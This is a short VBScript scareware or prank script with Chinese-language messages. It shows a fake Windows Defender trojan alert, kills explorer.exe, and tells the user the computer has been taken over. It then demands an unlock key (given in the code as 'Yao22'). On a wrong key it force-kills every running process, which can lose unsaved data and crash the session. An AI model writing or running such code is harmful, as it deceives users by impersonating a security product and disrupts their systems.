dim getinput
dim shell
Set shell = createObject("wscript.shell")
msgbox "Windows Defender发现一个威胁(Trojan:Win32/DSSDetection)，目前已隔离!",48,"Windows Defender"
shell.Run "taskkill /f /im explorer.exe"
msgbox "你的电脑已被控制！",48,"FS Error"
getinput = InputBox("你的电脑需要密钥解锁。如果密钥正确，将回复桌面，但如果错误将关闭所有运行的程序，您的数据将丢失！","","FS Error")
select case getinput
case "Yao22"
msgbox "Very good,您的电脑已解锁！",64,"FS Error"
shell.Run "explorer.exe"
case Else
msgbox "密码错误！"
shell.Run 'taskkill /f /fi "pid ne 0"'
end select

